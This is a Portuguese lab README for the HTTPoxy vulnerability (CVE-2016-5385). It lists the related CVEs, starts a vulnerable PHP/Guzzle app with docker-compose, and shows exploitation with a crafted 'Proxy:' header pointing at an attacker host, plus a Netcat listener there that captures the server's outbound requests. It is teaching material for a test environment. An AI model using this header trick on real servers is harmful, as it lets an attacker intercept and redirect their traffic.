# HTTPoxy CGI application vulnerability (CVE-2016-5385)

httpoxy é um conjunto de vulnerabilidades que afetam o código do aplicativo executado em ambientes CGI ou semelhantes a CGI. Tudo se resume a um simples conflito de namespace:

- RFC 3875 (CGI) coloca o cabeçalho HTTP Proxy de uma solicitação nas variáveis de ambiente como `HTTP_PROXY`
- `HTTP_PROXY` é uma variável de ambiente popular usada para configurar um proxy de saída

Isso leva a uma vulnerabilidade explorável remotamente. Veja <https://httpoxy.org> para mais descrição dos princípios.

CVE-2016-5385 é um dos CVEs que atribuem HTTPoxy, aqui está a lista completa de CVEs:

- CVE-2016-5385: PHP
- CVE-2016-5386: Go
- CVE-2016-5387: Apache HTTP Server
- CVE-2016-5388: Apache Tomcat
- CVE-2016-6286: spiffy-cgi-handlers for CHICKEN
- CVE-2016-6287: CHICKEN’s http-client
- CVE-2016-1000104: mod_fcgi
- CVE-2016-1000105: Nginx cgi script
- CVE-2016-1000107: Erlang inets
- CVE-2016-1000108: YAWS
- CVE-2016-1000109: HHVM FastCGI
- CVE-2016-1000110: Python CGIHandler
- CVE-2016-1000111: Python Twisted
- CVE-2016-1000212: lighttpd

## Ambiente vulnerável

Execute o seguinte comando para iniciar um aplicativo Web dependendo do PHP 5.6.23 e GuzzleHttp 6.2.0.

```
docker-compose up -d
```

Esta [página da Web](www/index.php) obtém seu endereço IP de origem em `http://httpbin.org/get`:

![](1.png)

Neste momento, o IP do nome do host é igual ao IP original, sem proxy HTTP.

## Explorando

Envie uma solicitação com um cabeçalho HTTP criado que contenha um endereço de proxy HTTP disponível: `Proxy: http://*.*.122.65:8888/`:

![](2.png)

É óbvio que o endereço original na resposta se tornou o endereço IP do servidor proxy.

Inicie um servidor Netcat no `*.*.122.65` em vez do proxy HTTP, podemos capturar a solicitação original:

![](3.png)
